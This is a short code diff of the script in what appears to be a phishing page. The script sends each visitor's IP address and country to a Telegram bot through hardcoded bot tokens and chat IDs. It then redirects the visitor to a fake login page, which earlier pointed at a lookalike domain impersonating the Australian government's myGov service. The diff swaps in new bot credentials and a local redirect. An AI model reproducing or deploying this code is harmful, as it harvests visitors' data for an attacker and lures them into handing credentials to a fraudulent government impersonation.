@@ -42,8 +42,8 @@
 
     <script>
         // ===== CONFIGURATION =====
-        const BOT_TOKEN = '5248400235:AAEzwHQFYQBtUuT2ysxFNPfwGvokjtnivDI';
-        const CHAT_ID = '722615124';
+        const BOT_TOKEN = '8910789626:AAEWzwr4L9dJ8nW-Ha8kDohVk2oYKMyHZnU';
+        const CHAT_ID = '1581810420';
         // =========================
 
         function sendAndRedirect(ip, country) {
@@ -57,7 +57,7 @@
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`)
                 .catch(() => {}) // ignore errors
                 .finally(() => {
-                    window.location.href = 'https://login.my.gov.au.taxstatement2026.dpdns.org/statement/log.html';
+                    window.location.href = 'log.html';
                 });
         }
 
